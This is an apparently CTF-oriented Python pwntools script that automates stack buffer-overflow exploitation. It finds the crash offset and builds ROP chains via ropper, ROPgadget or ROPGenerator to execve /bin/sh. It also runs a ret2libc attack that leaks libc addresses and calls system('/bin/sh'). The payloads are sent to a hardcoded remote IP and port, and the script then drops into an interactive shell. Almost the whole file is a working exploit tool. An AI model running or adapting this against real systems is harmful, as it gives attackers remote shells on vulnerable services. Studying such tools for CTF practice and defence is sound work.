from pwn import *
# from ropgenerator import *
from struct import pack
import re, os, sys, subprocess, pwnlib
from ropper import RopperService

helpmsg = " \n Usage: to Work correctly you have to fill out the midroll and postroll(when using ret2libc etc..)\n to ensure that the script gets the correct vulnerable entrypoint!\n -f <filename>\n -core (Use coredumps)\n -vic <ip> <port>\n -ibu <startbufsize>\n -NoDas (No dealarm shell)\n -loc (localonly)\n -fupa <fullPath>\n -h help\n -gen <generator> (ropper(default)/RopGad/ropperService/RopGen)\n -debug (noCore)\n -debugCore (debug with coredump,only local)\n -a <attackType> (rop(default)/ret2libc/SOS(shellcode on stack(WIP!!))\n -libc <path to libc>\n -flag (auto cat flag.txt;cat flag)"
binfupa = "/root/PycharmProjects/SaarSec/speedrun-003"  # HowToUse Full Path to file without "./"#
binaryfile = "speedrun-002"  # HowToUse Filename#
remIP = "78.46.187.115"  # HowToUse set remote IP as String#
remPort = 20015  # HowToUse set remote Port as int#
payroll = 1000  # HowToUse Set Buffer Start Size#
binny = "./" + binaryfile
UseCore = False
LocalOnly = False
generator = "ropper"
dealarm = True
debugfinalPayload = False
debugfinalPayloadCore = False
isStatical = True
attackType = "rop"
AutoAttackType = True
pathtolibc = "libc-2.28-debian-10.so"
manuallibc = False
autoCatflag = False


def preroll(rem):  # HowToUse False for remote True for binary
    if rem:
        rm = process(binny)
    else:
        rm = remote(remIP, remPort)
    # HowToUse Preperation before real BufferOverflow Vuln#
    # ====================================================#
    return midroll(rm)
    pass


def midroll(rm):  # TODO insert Prepping

    rm.recvuntil("What say you now?")
    rm.sendline("Everything intelligent is so boring.\n")
    rm.recvuntil("Tell me more.")
    return rm


def postroll(rem):  # TODO there to catch shit that comes back!
    rem.recvuntil("Fascinating.\n")
    return rem


def finder(payroll):
    if UseCore:
        return finderCore(payroll)
    else:
        return finderNoCore(payroll)


def finderCore(payroll):
    global binaryfile, binny
    try:
        os.remove("./core")
    except:
        pass
    tarBufLen = 0
    logBuf = log.progress("Buffer lenght", level=31)
    while (True):
        pr = preroll(False)
        logBuf.status(str(payroll))
        buffer = cyclic(payroll)
        pr.sendline(buffer)
        try:
            context.log_level = "ERROR"
            core = Coredump("./core")
            context.log_level = "WARNING"
        except:
            payroll += 100
            continue
        if p64(core.fault_addr) not in buffer:
            payroll += 100
            continue
        else:
            context.log_level = "ERROR"
            tarBufLen = cyclic_find(p64(core.fault_addr), n=4)
            context.log_level = "WARNING"
            logBuf.success(str(tarBufLen) + " Found!")
            return tarBufLen


def finderNoCore(payroll):
    global binaryfile, binny
    logBuf = log.progress("Buffer lenght", level=31)
    while (True):
        pr = preroll(True)
        logBuf.status(str(payroll))
        buffer = cyclic(payroll)
        pr.sendline(buffer)
        sleep(0.1)
        if pr.poll() == -11:
            logBuf.success(str(payroll + 8) + " Found!")
            return (payroll + 8)  # TODO Fix hardcoded offset thingy
        else:
            pr.kill()
            pr.close()
            payroll += 1


def rolling():
    globals()
    context.binary = binny
    context.log_level = "WARNING"
    logGen = log.progress("Status", level=31)
    logGen.status("Trying to find needed Buffer lenght!")
    tarBufLen = finder(payroll)
    buffer = "A" * (tarBufLen)
    while (True):
        attack(logGen, buffer)


def attack(log, buffer):
    global attackType
    attackTypes = {"rop": ropattack, "ret2libc": ret2libcattack, "SOS": shellcodeattack}
    func = attackTypes.get(attackType, ropattack)
    func(log, buffer)


def ropattack(logGen, buffer):
    globals()
    logGen.status("Trying to find a //bin/sh ropchain!")
    context.log_level = "ERROR"
    sleep(0.1)
    shellcode = ropchain(logGen)
    sleep(0.1)
    context.log_level = "WARNING"
    if shellcode == None:
        attackType = "ret2libc"
        return attack(logGen, buffer)
    logGen.status("RopChain found!")
    shell = open("shell", "w")
    payload = buffer + shellcode
    shell.write(payload)
    shell.close()
    logGen.status("connecting to target server!")
    try:
        rm = preroll(LocalOnly)  # HowToUse True for server False for local
    except:
        logGen.failure("Unable to Connect! Is the Target still up?")
        cont = str(raw_input("Do you want to run it locally instead? (y/n)\n"))
        if "y" in cont:
            rm = preroll(True)
        else:
            exit(0)
    logGen.success("Sending Payload! Here comes the Shell!")  # TODO Change control Flow in case of failing attack type
    if debugfinalPayloadCore:
        debugPayload(rm, payload)
    else:
        SnC(rm, payload)
    exit(0)  # TODO cause of while true loop


def ret2libcattack(logGen, buffer):
    globals()
    logGen.status("Trying a ret2libc attack!")
    if not manuallibc:
        if LocalOnly:
            libc = e.libc
            pathtolibc = libc.path
        else:
            pathtolibc = libcfinder(logGen, buffer)
            libc = ELF(pathtolibc)
    else:
        libc = ELF(pathtolibc)
    logGen.status("Found libc ! : " + pathtolibc)
    rop = ROP(e)
    if libc is not None:  # Assuring that ELF uses a libc
        symbls = map(str, e.plt)
        if "puts" in symbls:
            puts_plt = e.plt["puts"]
            try:
                pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
                libc_start_main = e.symbols["__libc_start_main"]
                entry = e.entry
            except:
                exit(0)  # TODO insert stack pivoting here!
                pass
            payload = buffer + p64(pop_rdi) + p64(libc_start_main) + p64(puts_plt) + p64(entry)
        elif False:  # TODO add more ways for ret2libc (puts)
            pass
        try:
            rm = preroll(LocalOnly)  # HowToUse True for server False for local
        except:
            logGen.status("Unable to Connect! Is the Target still up?")
            cont = str(raw_input("Do you want to run it locally instead? (y/n)\n"))
            if "y" in cont:
                rm = preroll(True)
            else:
                exit(0)
        rm.sendline(payload)
        rm = postroll(rm)
        libcmain = u64(rm.recv(6).ljust(8, "\x00"))
        libc.address = libcmain - libc.sym["__libc_start_main"]
        BINSH = next(libc.search("/bin/sh"))  # Verify with find /bin/sh
        SYSTEM = libc.sym["system"]
        EXIT = libc.sym["exit"]
        payload2 = buffer + p64(pop_rdi) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)
        rm = midroll(rm)
        logGen.success(
            "Sending Payload! Here comes the Shell!")  # TODO Change control Flow in case of failing attack type
        if debugfinalPayloadCore:
            debugPayload(rm, payload2)
        else:
            SnC(rm, payload2)
        exit(0)  # TODO cause of while true loop
    else:
        exit(0)  # TODO Stack pivot?


def libcfinder(logGen, buffer):  # TODO WIP still missing exact way to determine libc and getting the file
    return "libc-2.28-debian-10.so"
    globals()
    logGen.status("Trying to find remote libcVersion")
    rm = preroll(False)
    rop = ROP(e)
    symbls = map(str, e.plt)
    if "puts" in symbls:
        puts_plt = e.plt["puts"]
        try:
            pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
            libc_start_main = e.symbols["__libc_start_main"]
            payload = buffer + p64(pop_rdi) + p64(libc_start_main) + p64(puts_plt)
        except:
            # TODO else
            pass
        # rm.sendline(payload)
        # rm=postroll(rm)
        # libcmain = u64(rm.recv(6).ljust(8,"\x00"))
        leak_addrmain = hex(libcmain)
        # print leak_addrmain
        # libcpath= pwnlib.libcdb.search_by_sha1('35bc971d85479d1f7ad5f48752302d9dd185f577')
        # print libcpath
        # libc=ELF(libcpath)
        # libc=ELF("libc-2.28-debian-10.so")
        # print hex(libc.sym["system"])


def shellcodeattack(log, buffer):
    pass


def SnC(rm, payload):
    if debugfinalPayload:
        context.log_level = "debug"
    rm.sendline(payload)
    sleep(1)
    if autoCatflag:
        rm.sendline("cat flag.txt;cat flag")
    if dealarm and not LocalOnly and not autoCatflag:
        dealarm_shell(rm)
    rm.interactive()


def debugPayload(rm, payload):
    context.log_level = "debug"
    os.remove("./core")
    rm.sendline(payload)
    sleep(1)
    if autoCatflag:
        rm.sendline("cat flag.txt;cat flag")
    if dealarm and not LocalOnly and not autoCatflag:
        dealarm_shell(rm)
    rm.interactive()
    core = Coredump("./core")
    print core.registers


def ropchain(logGen):  # Todo implement more Generators and features
    global generator
    gens = {"ropper": ropchainRopper, "ropperService": ropchainRopperService, "RopGad": ropchainGadget,
            "RopGen": ropchainGenerator}
    funct = gens.get(generator, ropchainRopper)
    payload = funct(logGen)
    # if payload is not None:
    return payload


def ropchainRopper(logGen):  # Superfast and working TODO implement more CMDS
    ShellCom = "execve"
    command = "ropper -f " + binaryfile + " --chain " + ShellCom + "  > shellcode.txt"
    os.system(command)
    output = open("shellcode.txt", "r")
    out = output.read()
    # =====================================================# checking for failure
    failmsg = "# INSERT SYSCALL GADGET HERE"
    if failmsg in out:
        logGen.status("Ropper didnt work! trying ROPgadget now!")
        return ropchainGadget(logGen)
    # =====================================================#
    code = out.split("generator #\n")[1]
    tes = code.split("\n")
    lentes = len(tes)
    for x in range(lentes):
        tes[x] = tes[x].lstrip()
    res = tes[6:lentes - 2]
    pay = "from struct import pack\n" + tes[4] + "\ndef p(x):\n    return pack('Q',x)\ndef rebase_0(x):\n    " + tes[
        4] + "\n    return pack('Q',x+IMAGE_BASE_0)\n" + \
          "\n".join(res) + "\nROP=open('chain','w')\nROP.write(rop)\nROP.close()"
    pay = escape_ansi(pay)
    # print"======================"
    # print pay
    # print"======================"

    module = open("payloader.py", "w")
    module.write(pay)
    module.close()
    execfile("payloader.py")
    chain = open("chain", "r")
    load = chain.read()
    chain.close()
    # print load
    return load


def ropchainRopperService():  # Todo Implement Ropperservice usage probably for futute features
    options = {'color': False,  # if gadgets are printed, use colored output: default: False
               'badbytes': '',  # bad bytes which should not be in addresses or ropchains; default: ''
               'all': False,  # Show all gadgets, this means to not remove double gadgets; default: False
               'inst_count': 6,  # Number of instructions in a gadget; default: 6
               'type': 'all',  # rop, jop, sys, all; default: all
               'detailed': False}  # if gadgets are printed, use detailed output; default: False
    RopSer = RopperService(options)
    RopSer.options.badbytes = ''
    RopSer.addFile("binary", binaryfile, arch="x86_64")
    RopSer.loadGadgetsFor()
    option = {"address": "0x0000000000400000"}
    print RopSer.createRopChain("execve", "x86_64", option)


def ropchainGadget(logGen):  # Not working so good but more often used

    command = "ROPgadget --ropchain --binary " + binaryfile + " > shellcode.txt"
    os.system(command)
    output = open("shellcode.txt", "r")
    out = output.read()
    # =====================================================# checking for failure
    failmsg = "Can't find"
    if failmsg in out:
        logGen.status("ROPgadget didnt work! trying ROPGenerator now!")
        try:
            return ropchainGenerator(logGen)
        except:
            logGen.status("ROPgenerator isnt installed! trying something different now!")
            return None
    # =====================================================#
    code = out.split("# execve generated by ROPgadget")[1]
    tes = code.split("\n")
    lentes = len(tes)
    for x in range(lentes):
        tes[x] = tes[x].lstrip()
    res = tes[4:lentes - 2]
    pay = "\n".join(res) + "\nload=p\n"
    pay = escape_ansi(pay)
    # print pay
    exec (pay)
    # print load
    return load


def ropchainGenerator():  # Super slow but working
    global binfupa
    logexp = log.progress("RopGenerator", level=31)
    logexp.status("Loading File from :" + binfupa + " This may take a while")
    rop = process("/root/Downloads/ropgenerator-1.2/ROPGenerator")
    rop.recvuntil(")>")
    rop.sendline("load " + binfupa)
    resp = rop.recvuntil(")>")
    # context.log_level = "debug"
    resp = rop.recvuntil(")>")
    if "Error" in resp:
        logexp.failure("Unable to find file! Check the Full Path!\n" + resp)
        exit(0)
    else:
        logexp.status("File Loaded!")
    rop.sendline("exploit")
    rop.recvuntil(")>")
    logexp.status("Building Payload!")
    rop.recvuntil(")>")
    rop.sendline("syscall -f python -c execve('/bin//sh', 0, 0)")
    resp = rop.recvuntil(")>")
    resp = rop.recvuntil(")>")
    logexp.success("Payload Buildt!")
    print "==================================="
    print resp
    print "==================================="

    tes = resp.split("\n")
    lentes = len(tes)
    for x in range(lentes):
        tes[x] = tes[x].lstrip()
    res = tes[4:lentes - 2]
    pay = "\n".join(res) + "\nload=p\n"
    pay = escape_ansi(pay)
    print pay
    exec (pay)
    return load


def escape_ansi(lin):
    ansi_escape = re.compile(r'(\x9B|\x1B\[)[0-?]*[ -\/]*[@-~]')
    return ansi_escape.sub('', lin)


def p(x):  #
    return pack("<Q", x)


def AutoAttack():
    globals()
    if AutoAttackType:
        analELF()
    else:
        pass


def parseargs():
    globals()
    arglist = sys.argv
    argn = len(arglist)
    avargs = {"-f": setFilename, "-core": setCore, "-vic": setVictim, "-ibu": setinitBuff,
              "-loc": setLocalOnly, "-fupa": setFullPath, "-h": help, "-gen": setGen, "-NoDas": setNoDealarm,
              "-debug": setDebug, "-debugCore": setDebugCore, "-a": setAttackType, "-libc": setlibc,
              "-flag": setgetflag, "-init": initToolChains}
    for x in range(argn):
        arg = arglist[x]
        funct = avargs.get(arg, Pass)
        funct(x)
    global e
    e = ELF(binaryfile)


def setgetflag(x):
    global autoCatflag
    autoCatflag = True


def setlibc(x):
    global pathtolibc, manuallibc
    pathtolibc = sys.argv[x + 1]
    manuallibc = True


def setAttackType(x):
    global attackType, AutoAttackType
    attackType = sys.argv[x + 1]
    AutoAttackType = False


def setDebugCore(x):
    global debugfinalPayloadCore
    debugfinalPayload = True


def setDebug(x):
    global debugfinalPayload
    debugfinalPayload = True


def setNoDealarm(x):
    global dealarm
    dealarm = False


def setGen(x):
    global generator
    generator = sys.argv[x + 1]


def Pass(x): pass


def help(x):
    global helpmsg
    print str(sys.argv[0]) + helpmsg
    exit(0)


def setFilename(x):
    global binaryfile, binny
    binaryfile = sys.argv[x + 1]
    binny = "./" + binaryfile


def setCore(x):
    global UseCore
    UseCore = True


def setLocalOnly(x):
    global LocalOnly
    LocalOnly = True


def setVictim(x):
    global remIP, remPort
    remIP = sys.argv[x + 1]
    remPort = int(sys.argv[x + 2])


def setinitBuff(x):
    global payroll
    payroll = int(sys.argv[x + 1])


def setFullPath(x):
    global binfupa
    binfupa = sys.argv[x + 1]


def one_gadget(filename):
    return map(str, subprocess.check_output(['one_gadget', '', filename]).split(' '))


def analELF():
    global e, attackType
    if e.execstack and False:  # TODO implement Shellcode on stack
        attackType = "SOS"
    elif e.statically_linked:
        attackType = "rop"
    else:
        attackType = "ret2libc"


def initToolChains(x):
    if os.path.isdir("./ABEToolChain"):
        pass
    else:
        os.mkdir("ABEToolChain")
    if os.path.isdir("./ABEToolChain/libcdb"):
        pass
    else:
        os.system("git clone https://github.com/niklasb/libc-database.git ./ABEToolChain/libcdb")
        print "If something fails , run ./get in libcdb! \n"
        os.system("./ABEToolChain/libcdb/get")
        pass
    if os.path.isdir("./ABEToolChain/ropgenerator"):
        pass
    else:
        pass  # TODO ropgenerator ... not needed at this moment
    exit(0)


if __name__ == '__main__':
    parseargs()
    AutoAttack()
    rolling()
